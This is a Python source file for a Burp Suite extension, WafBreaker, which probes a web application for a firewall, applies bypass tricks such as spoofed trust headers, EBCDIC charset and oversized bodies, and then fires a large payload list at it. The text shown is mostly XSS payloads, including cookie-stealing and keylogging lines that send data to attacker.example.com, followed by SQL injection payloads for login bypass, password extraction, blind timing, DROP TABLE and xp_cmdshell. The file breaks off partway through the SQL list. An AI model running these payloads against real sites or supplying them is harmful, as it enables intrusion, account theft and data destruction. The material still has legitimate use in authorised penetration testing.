# -*- coding: utf-8 -*-
"""
██╗    ██╗ █████╗ ███████╗██████╗ ██████╗ ███████╗ █████╗ ██╗  ██╗███████╗██████╗
██║    ██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
██║ █╗ ██║███████║█████╗  ██████╔╝██████╔╝█████╗  ███████║█████╔╝ █████╗  ██████╔╝
██║███╗██║██╔══██║██╔══╝  ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
╚███╔███╔╝██║  ██║██║     ██████╔╝██║  ██║███████╗██║  ██║██║  ██╗███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

  Burp Suite WAF Bypass Extension  |  v1.0
  Select parameter value → Right-click → WafBreaker → [Vuln Type]

  Phase 1  →  Initial probe (detects WAF)
  Phase 2  →  Pre-bypass techniques (headers, charset, method, body-size, overrides)
  Phase 3  →  Full payload barrage using the working bypass technique

  Bypass techniques from article:
    · HTTP Header Trust  (X-Forwarded-For, X-Originating-IP, X-Remote-IP ...)
    · Charset manipulation  (ibm037 / EBCDIC)
    · HTTP Method override  (custom verbs, X-HTTP-Method-Override)
    · Large body padding  (>128 KB — exceeds WAF inspection limit)
    · Encoding obfuscation  (case, null-byte, double-tag, unicode, entities ...)
"""

from burp import IBurpExtender, IContextMenuFactory, IScanIssue
from javax.swing import JMenuItem, JMenu
from java.util import ArrayList
from java.lang import Runnable
from java.lang import Thread as JThread
import re
import time
import os as _os
import zlib as _zlib
import struct as _struct

EXT_NAME  = "WafBreaker"
VERSION   = "1.0"

# ═══════════════════════════════════════════════════════════════════════════════
#   PAYLOAD DATABASE
# ═══════════════════════════════════════════════════════════════════════════════

INITIAL_PROBES = {
    "XSS":               "<script>alert(1)</script>",
    "SQL Injection":     "' OR 1=1--",
    "Command Injection": "; id",
    "LFI":               "../../../etc/passwd",
    "SSRF":              "http://127.0.0.1/",
}

PAYLOADS = {
    "XSS": [
        # ── Basic script tags ─────────────────────────────────────────────────
        "<script>alert(1)</script>",
        "<script>confirm(1)</script>",
        "<script>prompt(1)</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        "<script>console.log(document.domain)</script>",
        # ── Case toggling ─────────────────────────────────────────────────────
        "<sCrIpT>alert(1)</sCriPt>",
        "<SCRIPT>ALERT(1)</SCRIPT>",
        "<ScRiPt>AlErT(1)</ScRiPt>",
        # ── Null byte ─────────────────────────────────────────────────────────
        "<scri%00pt>alert(1)</scri%00pt>",
        "<scri\x00pt>alert(1)</scri\x00pt>",
        # ── Double / nested tag ───────────────────────────────────────────────
        "<scri<script>pt>alert(1)</scr</script>ipt>",
        "<sc<script>ript>alert(1)</sc</script>ript>",
        "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
        # ── Unicode inside script ─────────────────────────────────────────────
        "<script>\\u0061lert('22')</script>",
        "<script>eval('\\x61lert(1)')</script>",
        "<script>eval(8680439..toString(30))(983801..toString(36))</script>",
        "<script>String.fromCharCode(97,108,101,114,116)(1)</script>",
        # ── img onerror ───────────────────────────────────────────────────────
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert('XSS');>",
        "<img src=x onerror=alert('XSS')//",
        "<img/src=1/onerror=alert(1)>",
        "<img src=\"x\" onerror=\"alert(1)\">",
        "<img src=x onerror=alert(String.fromCharCode(88,83,83));>",
        "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
        "<img src=1 onerror=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>",
        "<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>",
        "\"><img src=x onerror=alert('XSS');>",
        "<><img src=1 onerror=alert(1)>",
        # ── SVG ───────────────────────────────────────────────────────────────
        "<svg/onload=alert(1)>",
        "<svg onload=alert(1)>",
        "<svg onload=alert(1)//",
        "<svg><script>alert(1)</script></svg>",
        "<svg><script>alert&lpar;1&rpar;",
        "<svg id=alert(1) onload=eval(id)>",
        "\"><svg/onload=alert(String.fromCharCode(88,83,83))>",
        "\"><svg/onload=alert(/XSS/)>",
        "<svgonload=alert(1)>",
        "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>",
        "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
        "<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>",
        "<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>",
        "<svg><animatetransform onbegin=\"alert(1)\"></animatetransform></svg>",
        "<svg><script href=data:,alert(1) />",
        # ── Autofocus / focus events ──────────────────────────────────────────
        "<input autofocus onfocus=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        # ── body / load events ────────────────────────────────────────────────
        "<body onload=alert(1)>",
        "<body/onload=alert(1)>",
        "<body onload=alert(/XSS/.source)>",
        "<body ontouchstart=alert(1)>",
        "<body ontouchend=alert(1)>",
        "<body ontouchmove=alert(1)>",
        # ── Pointer events ────────────────────────────────────────────────────
        "<div onpointerover=\"alert(1)\">HOVER</div>",
        "<div onpointerdown=\"alert(1)\">CLICK</div>",
        "<div onpointerenter=\"alert(1)\">ENTER</div>",
        "<div onpointermove=\"alert(1)\">MOVE</div>",
        "<div onpointerout=\"alert(1)\">OUT</div>",
        "<div onpointerup=\"alert(1)\">UP</div>",
        # ── Media elements ────────────────────────────────────────────────────
        "<video/poster/onerror=alert(1)>",
        "<video><source onerror=\"javascript:alert(1)\">",
        "<video src=_ onloadstart=\"alert(1)\">",
        "<video src=1 onerror=alert(1)>",
        "<audio src onloadstart=alert(1)>",
        "<audio src=1 onerror=alert(1)>",
        # ── HTML5 misc ────────────────────────────────────────────────────────
        "<details open ontoggle=alert(1)>",
        "<details/open/ontoggle=\"alert`1`\">",
        "<marquee onstart=alert(1)>",
        "<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>",
        "<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\">",
        "<input type=\"hidden\" oncontentvisibilityautostatechange=\"alert(1)\" style=\"content-visibility:auto\">",
        # ── Objects / embeds ──────────────────────────────────────────────────
        "<object data=javascript:alert(1)>",
        "<object/data=\"jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;1&#x29;\">",
        "<iframe src=javascript:alert(1)>",
        "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\">",
        "<form action=javascript:alert(1)><input type=submit>",
        "<button onclick=alert(1)>XSS</button>",
        # ── javascript: protocol variants ─────────────────────────────────────
        "javascript:alert(1)",
        "javascript:prompt(1)",
        "javascript:confirm(document.domain)",
        "javascript://%0Aalert(1)",
        "javascript://anything%0D%0A%0D%0Awindow.alert(1)",
        "java%0ascript:alert(1)",
        "java%09script:alert(1)",
        "java%0dscript:alert(1)",
        "\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3aalert(1)",
        "\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003aalert(1)",
        "\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\072alert(1)",
        # ── MathML ────────────────────────────────────────────────────────────
        "<math href=\"javascript:alert(1)\">CLICK</math>",
        # ── HTML entity encoding ──────────────────────────────────────────────
        "&#34;&#62;&#60;img src=x onerror=confirm&#40;1&#41;&#62;",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41",
        "%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341",
        # ── CSS injection ─────────────────────────────────────────────────────
        "<STYLE>.x{background-image:url(\"javascript:alert(1)\")}</STYLE>",
        "background-image: url(\"data:image/jpg;base64,<\\/style><svg/onload=alert(1)>\");",
        # ── Extra attribute confusion ──────────────────────────────────────────
        "<a aa aaa aaaa href=javascript:alert(1)>xss</a>",
        # ── URL / percent encoding ────────────────────────────────────────────
        "<a src=\"%3Aconfirm(1)\">",
        "<a href=\"javascript%3Aalert(1)\">click</a>",
        "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
        # ── Line break injection in protocol ──────────────────────────────────
        "<a src=\"%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(1)\">",
        # ── Unicode / backslash in handler ────────────────────────────────────
        "<marquee onstart=\\u0070r\\u006fmpt(1)>",
        "<img src=x onerror=\\u0061lert(1)>",
        # ── data URI ──────────────────────────────────────────────────────────
        "data:text/html,<script>alert(0)</script>",
        "data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+",
        "<script src=\"data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"></script>",
        # ── VBScript (IE legacy) ──────────────────────────────────────────────
        "vbscript:msgbox(\"XSS\")",
        # ── noscript bypass ───────────────────────────────────────────────────
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        # ── Context escapes ───────────────────────────────────────────────────
        "'-alert(1)-'",
        "\"><script>alert(1)</script>",
        "';alert(1)//",
        "</script><script>alert(1)</script>",
        "\"onmouseover=\"alert(1)",
        "#\"><img src=/ onerror=alert(2)>",
        "-(confirm)(document.domain)//",
        "; alert(1);//",
        # ── Fetch / exfil (OOB) ───────────────────────────────────────────────
        "<script>fetch('https://attacker.example.com',{method:'POST',mode:'no-cors',body:document.cookie});</script>",
        "<svg/onload='fetch(\"//attacker.example.com/\"+document.cookie)'>",
        "<script>new Image().src=\"http://attacker.example.com/?c=\"+document.cookie;</script>",
        "<img src=x onerror='document.onkeypress=function(e){fetch(\"http://attacker.example.com/?k=\"+String.fromCharCode(e.which))},this.remove();'>",
        # ── CDATA / namespace tricks ──────────────────────────────────────────
        "<something:script xmlns:something=\"http://www.w3.org/1999/xhtml\">alert(1)</something:script>",
        # ── Markdown (for markdown renderers) ────────────────────────────────
        "[a](javascript:prompt(document.cookie))",
        "[a](j a v a s c r i p t:prompt(document.cookie))",
        "[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)",
        "[a](javascript:window.onerror=alert;throw%201)",
        # ── DOM-based ─────────────────────────────────────────────────────────
        "<script>debugger;</script>",
        "<script>alert(document.domain.concat('\\n').concat(window.origin))</script>",
        # ── Template engine injections ────────────────────────────────────────
        "${alert(1)}",
        "{{constructor.constructor('alert(1)')()}}",
        "{{7*7}}",
        "#{7*7}",
        "*{color:red}",
        # ── AngularJS sandbox escapes ─────────────────────────────────────────
        "{{$on.constructor('alert(1)')()}}",
        "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}",
        "1&ng-app&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
        # ── Event handler misc ────────────────────────────────────────────────
        "<select onchange=alert(1)><option>1</option><option>2</option></select>",
        "<form><button formaction=javascript:alert(1)>CLICK</button></form>",
        "<isindex action=javascript:alert(1) type=image>",
        "<isindex type=image src=1 onerror=alert(1)>",
        "<link rel=import href=\"data:text/html,<script>alert(1)</script>\">",
        # ── Awesome-WAF: specific WAF bypasses ────────────────────────────────
        # Cloudflare
        "<svg onx=() onload=(confirm)(1)>",
        "<a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>test</a>",
        "<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f>",
        "<a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\\u0061\\u006C\\u0065\\u0072\\u0074&lpar;1&rpar;\">X</a>",
        "javascript:{alert`0`}",
        "<j id=x style=\"-webkit-user-modify:read-write\" onfocus={window.onerror=eval}throw/0/+name>H</j>#x",
        # Barracuda
        "<body style=\"height:1000px\" onwheel=\"alert(1)\">",
        "<div contextmenu=\"xss\">Right-Click<menu id=\"xss\" onshow=\"alert(1)\">",
        "<a href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()>clickhere",
        # Cloudbric / F5
        "<a69/onclick=[1].findIndex(alert)>pew",
        "<table background=\"javascript:alert(1)\"></table>",
        "\"/><marquee onfinish=confirm(123)>a</marquee>",
        # Comodo
        "<input/oninput='new Function`confir\\u006d\\`0\\``'>",
        "<p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True>dragme",
        # DotDefender
        "<img src=\"WTF\" onError=\"{var {3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v%2Ba%2Be%2Bs](e%2Bs%2Bv%2Bh%2Bn)(/0wn3d/.source)\" />",
        # HTML5 popover (modern)
        "<strong><button popovertarget=x>click</button><test onbeforetoggle=alert(document.domain) popover id=x>x</test></strong>",
        # ModSecurity
        "<a href=\"jav%0Dascript&colon;alert(1)\">",
        # CRLF iframe
        "<iframe src=\"%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(0)\">",
        # Dynamic concatenation
        "<script>eval('al'+'er'+'t()')</script>",
        "<script>+-+-1-+-+alert(1)</script>",
        # Junk attribute flood
        "<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe",
        # Comment in script
        "<!--><script>alert/**/()/**/</script>",
        # Tab separating javascript: keyword
        "<iframe    src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>",
        # AWS WAF
        "<script>eval(atob(decodeURIComponent('YWxlcnQoMSk=')))</script>",
        # ── Wave-3: Mutation XSS (mXSS) ──────────────────────────────────────
        "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)\">",
        "<!--<img src=x onerror=alert(1)-->",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<svg><set attributename=onmouseover value=alert(1)>",
        # ── Wave-3: Web Components / Shadow DOM ──────────────────────────────
        "<custom-tag><script>alert(1)</script></custom-tag>",
        "<a is=img src=x onerror=alert(1)>",
        # ── Wave-3: CSP bypass ────────────────────────────────────────────────
        "<base href='//evil.com/'>",
        # ── Wave-3: Angular / Vue template injection ─────────────────────────
        "{{constructor.constructor('alert(1)')()}}",
        "{{$on.constructor('alert(1)')()}}",
        "{{7*7}}{{constructor.constructor('alert(1)')()}}",
        "{{_c.constructor('alert(1)')()}}",
        # ── Wave-3: XSS polyglot ─────────────────────────────────────────────
        "jaVasCript:/*-/*`/*`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        # ── Wave-3: Rarely-filtered event handlers ───────────────────────────
        "<img src=x onpointerover=alert(1)>",
        "<img src=x ontransitionend=alert(1) style='transition:1s'>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<video autoplay onplay=alert(1)><source src=x></video>",
        "<input autofocus onfocus=alert(1)>",
        "<body onpageshow=alert(1)>",
        "<object data='javascript:alert(1)'>",
        # ── Wave-3: iframe / srcdoc ───────────────────────────────────────────
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<iframe src=javascript:alert(1)>",
        # ── Wave-3: CSS-based data exfil ─────────────────────────────────────
        "</style><style>@import'//evil.com/x?c=",
        "<link rel=stylesheet href='//evil.com/x.css'>",
        # ── Wave-3: SVG extra event vectors ─────────────────────────────────
        "<svg><script href=data:,alert(1) />",
        "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x\">",
        "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
        # ── Wave-3: HTML5 rare elements ──────────────────────────────────────
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
        "<form><isindex formaction=javascript:alert(1) type=submit>",
        "<form id=x></form><button form=x formaction=javascript:alert(1)>clickme",
        # ── Mutation XSS (mXSS) ───────────────────────────────────────────────
        "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)\">",
        "<!--<img src=x onerror=alert(1)-->",
        "<p title='</p><img src=x onerror=alert(1)'>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<svg><set attributename=onmouseover value=alert(1)>",
        # ── DOM-based / JavaScript URI variants ───────────────────────────────
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'/>",
        "javascript:void(alert(1))",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "<a href=javascript:alert(1)>click</a>",
        "<a href=\"javascript&colon;alert(1)\">click</a>",
        # ── Attribute context injection ────────────────────────────────────────
        "\"onmouseover=\"alert(1)\"",
        "\" autofocus onfocus=alert(1) \"",
        "' autofocus onfocus='alert(1)'",
        "onmouseover=alert(1)//",
        "\"><img src=x onerror=alert(1)>",
        "'><img src=x onerror=alert(1)>",
        # ── WAF evasion: tab/newline in event handlers ─────────────────────────
        "<img src=x\tonerror=alert(1)>",
        "<img src=x\nonerror=alert(1)>",
        "<img src=x\ronerror=alert(1)>",
        "<img src=x o\x00nerror=alert(1)>",
        "<img src=x on​error=alert(1)>",
        "<img src=x o&#110;error=alert(1)>",
        "<img src=x o&#0110;error=alert(1)>",
        "<img src=x on&#x65;rror=alert(1)>",
        # ── New event handler variants ─────────────────────────────────────────
        "<img src=x onpointerover=alert(1)>",
        "<img src=x ontransitionend=alert(1) style=\"transition:1s\">",
        "<img src=x onanimationend=alert(1) style=\"animation:x 1s\">",
        "<details open ontoggle=alert(1)>",
        "<details ontoggle=alert(1) open>test</details>",
        "<marquee onstart=alert(1)>test</marquee>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)></textarea>",
        "<video autoplay onplay=alert(1)><source src=x></video>",
        "<input oninput=alert(1) value=x autofocus>",
        "<body oncut=alert(1)>",
        "<body oncopy=alert(1)>",
        "<body onpaste=alert(1)>",
        "<div onwheel=alert(1)>scroll</div>",
        "<div onscroll=alert(1) style=\"overflow:scroll;height:50px;width:50px\">x<br><br><br></div>",
        "<body ondrag=alert(1)>drag</body>",
        "<img src=x onpointerenter=alert(1)>",
        # ── SVG/XML XSS ───────────────────────────────────────────────────────
        "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>",
        "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>",
        "<svg><script>alert&lpar;1&rpar;</script></svg>",
        "<svg><script>&#97;&#108;&#101;&#114;&#116;(1)</script></svg>",
        "<svg/onload=eval(atob('YWxlcnQoMSk='))>",
        "<svg/onload=fetch('/').then(r=>r.text()).then(eval)>",
        # ── Client-side template injection ────────────────────────────────────
        "{{constructor.constructor('alert(1)')()}}",
        "{{$on.constructor('alert(1)')()}}",
        "{{7*7}}{{constructor.constructor('alert(1)')()}}",
        "{{_c.constructor('alert(1)')()}}",
        "${alert(1)}",
        "#{alert(1)}",
        "%{alert(1)}",
        # ── iframe / object / embed ────────────────────────────────────────────
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<iframe src=javascript:alert(1)>",
        "<object data=javascript:alert(1)>",
        "<object data=\"data:text/html,<script>alert(1)</script>\">",
        "<embed src=javascript:alert(1)>",
        "<embed src=\"data:text/html,<script>alert(1)</script>\">",
        # ── CSS exfil / expression ─────────────────────────────────────────────
        "</style><style>@import'//x.x?c=",
        "<link rel=stylesheet href='//x.x/x.css'>",
        "<style>body{background:url('javascript:alert(1)')}</style>",
        "*{color:expression(alert(1))}",
        # ── Web Components / custom elements ──────────────────────────────────
        "<custom-element><script>alert(1)</script></custom-element>",
        "<a is=img src=x onerror=alert(1)>",
        # ── CSP bypass ────────────────────────────────────────────────────────
        "<base href='//evil.example.com/'>",
        "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
        # ── Polyglot XSS ──────────────────────────────────────────────────────
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "<script>/* </script><script>*/alert(1)</script>",
        "<!--<script>-->alert(1)<!--</script>-->",
        # ── Prototype pollution ────────────────────────────────────────────────
        "<img src=x onerror=\"Object.prototype.toString=alert;throw 1\">",
        # ── Fetch / import ────────────────────────────────────────────────────
        "<script>import('data:text/javascript,alert(1)')</script>",
        "<script>fetch('/').then(r=>r.text()).then(eval)</script>",
        # ── Conditional compilation (IE) ──────────────────────────────────────
        "<script>/*@cc_on alert(1) @*/</script>",
        "<!--[if IE]><script>alert(1)</script><![endif]-->",
    ],

    "SQL Injection": [
        # ── Auth bypass ───────────────────────────────────────────────────────
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR '1'='1'--",
        "' or 1=1 limit 1 --",
        "') OR ('1'='1",
        "')) OR (('1'='1",
        "1 OR 1=1",
        "1' OR '1'='1",
        "or 1-- -",
        "' or 1 or '1",
        "\"or 1 or\"",
        "admin'--",
        "admin' #",
        "admin'/*",
        "admin' OR '1'='1",
        "' OR 'x'='x",
        "admin' AND 1=0 UNION ALL SELECT 'admin','161ebd7d45089b3446ee4e0d86dbcf92'--",
        # ── UNION column count enumeration ────────────────────────────────────
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT 1--",
        "' UNION SELECT 1,2--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION ALL SELECT 1,2,3--",
        # ── UNION data extraction ─────────────────────────────────────────────
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT table_name,2 FROM information_schema.tables--",
        "' UNION SELECT column_name,2 FROM information_schema.columns--",
        "' UNION SELECT @@version,2--",
        "' UNION SELECT user(),2--",
        "' UNION SELECT database(),2--",
        "' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--",
        # ── WAF bypass: comment injection (article + OWASP) ───────────────────
        "' un/**/ion sel/**/ect 1,2,3--",
        "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
        "' UNION%20SELECT%201,2,3--",
        "' UNION%09SELECT%091,2,3--",
        "'+UNION+SELECT+1,2,3--",
        "1/*comment*/AND/**/1=1/**/--",
        "1/*!12345UNION*//*!12345SELECT*/1--",
        "/**//*!50000%55nIOn*//**//*!50000%53eLECt*//**/1,2,3--",
        "/_!%55NiOn_/ /_!%53eLEct_/ 1,2,3--",
        "+#uNiOn+#sEleCt+1,2,3--",
        "/_!u%6eion_/ /_!se%6cect_/ 1,2,3--",
        # ── WAF bypass: no-space alternatives ─────────────────────────────────
        "1%09AND%091=1%09--",
        "1%0AAND%0A1=1%0A--",
        "1%0BAND%0B1=1%0B--",
        "1%0CAND%0C1=1%0C--",
        "1%0DAND%0D1=1%0D--",
        "1%A0AND%A01=1%A0--",
        "(1)AND(1)=(1)--",
        "1%09union%09select%091,2,3--",
        "uni%0bon+se%0blect+1,2,3--",
        # ── WAF bypass: case variation ────────────────────────────────────────
        "1+UnIoN/**/SeLecT/**/1,2,3--",
        "1+UNunionION+SEselectLECT+1,2,3--",
        "%55nion(%53elect)1,2,3--",
        "union%20distinct%20select%201,2,3--",
        "u%6eion se%6cect 1,2,3--",
        "unio%6e se%6cect 1,2,3--",
        # ── WAF bypass: HTTP parameter pollution ──────────────────────────────
        "1;select+1&id=2,3+from+users+where+id=1--",
        "1+union/_&b=_/select+1,2,3--",
        # ── WAF bypass: hex / concat tricks ──────────────────────────────────
        "concat(0x223e,@@version)",
        "concat(0x273e27,version(),0x3c212d2d)",
        "(1)union(select(1),hex(hash)from(users))",
        "(1)union(((((((select(1),hex(hash)from(users))))))))",
        # ── ORDER BY enumeration ──────────────────────────────────────────────
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "1' ORDER BY 4--",
        "1' ORDER BY 5--",
        # ── Boolean blind ─────────────────────────────────────────────────────
        "1 AND 1=1",
        "1 AND 1=2",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1 AND 1=1--",
        "1' RLIKE '1",
        "1' OR '1' LIKE '1",
        "1) OR (1=1",
        "1)) OR ((1=1",
        "/?id=1+OR+0x50=0x50",
        "1 AND LENGTH(@@hostname)=1--",
        "1 AND ASCII(SUBSTRING(@@hostname,1,1))>64--",
        "SUBSTRING(VERSION(),1,1)LIKE(5)",
        "SUBSTRING(VERSION(),1,1)NOT IN(4,3)",
        "SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4",
        # ── Error-based: MySQL EXTRACTVALUE ───────────────────────────────────
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--",
        # ── Error-based: MySQL UPDATEXML ──────────────────────────────────────
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--",
        # ── Error-based: MySQL EXP ────────────────────────────────────────────
        "' AND EXP(~(SELECT * FROM (SELECT version())x))--",
        # ── Error-based: MySQL FLOOR/RAND ─────────────────────────────────────
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        # ── Error-based: MySQL GTID_SUBSET ────────────────────────────────────
        "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        # ── Error-based: PostgreSQL CAST ──────────────────────────────────────
        "' AND 1=CAST((SELECT version()) AS NUMERIC)--",
        "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS NUMERIC)--",
        # ── Error-based: MSSQL CONVERT ────────────────────────────────────────
        "' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "' AND 1=CONVERT(INT,@@version)--",
        # ── Error-based: Oracle XMLType ───────────────────────────────────────
        "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT banner FROM v$version WHERE ROWNUM=1)||CHR(62))) FROM DUAL)--",
        # ── Time-based: MySQL SLEEP ───────────────────────────────────────────
        "' AND SLEEP(5)--",
        "' AND SLEEP(5)#",
        "' OR SLEEP(5)#",
        "' AND '1'='1' AND SLEEP(5)",
        "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
        "1 AND IF(1=1,SLEEP(5),0)--",
        "1 AND IF(SUBSTRING(VERSION(),1,1)=5,SLEEP(5),0)--",
        "1 AND ELT(1=1,SLEEP(5))--",
        "RLIKE SLEEP(5)",
        # ── Time-based: MySQL BENCHMARK ───────────────────────────────────────
        "' AND BENCHMARK(5000000,MD5('test'))--",
        "' OR BENCHMARK(5000000,SHA1('test'))--",
        "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
        # ── Time-based: PostgreSQL ────────────────────────────────────────────
        "'; SELECT pg_sleep(5)--",
        "' AND (SELECT 1 FROM PG_SLEEP(5))--",
        "' AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))--",
        # ── Time-based: MSSQL ─────────────────────────────────────────────────
        "1; WAITFOR DELAY '0:0:5'--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1; WAITFOR DELAY '0:0:5'",
        "';waitfor delay '0:0:5'--",
        # ── Time-based: Oracle ────────────────────────────────────────────────
        "' AND DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)=1--",
        "' OR DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)=1--",
        # ── Time-based: SQLite heavy query ────────────────────────────────────
        "1 AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--",
        # ── Stacked queries ───────────────────────────────────────────────────
        "'; SELECT * FROM users--",
        "1'; DROP TABLE users--",
        "1; EXEC xp_cmdshell('whoami')--",
        "1; EXEC sp_configure 'show advanced options',1; RECONFIGURE--",
        # ── Null byte ─────────────────────────────────────────────────────────
        "' OR 1=1%00",
        "' OR 1=1\x00",
        # ── Double URL encoding ───────────────────────────────────────────────
        "%2527 OR 1=1--",
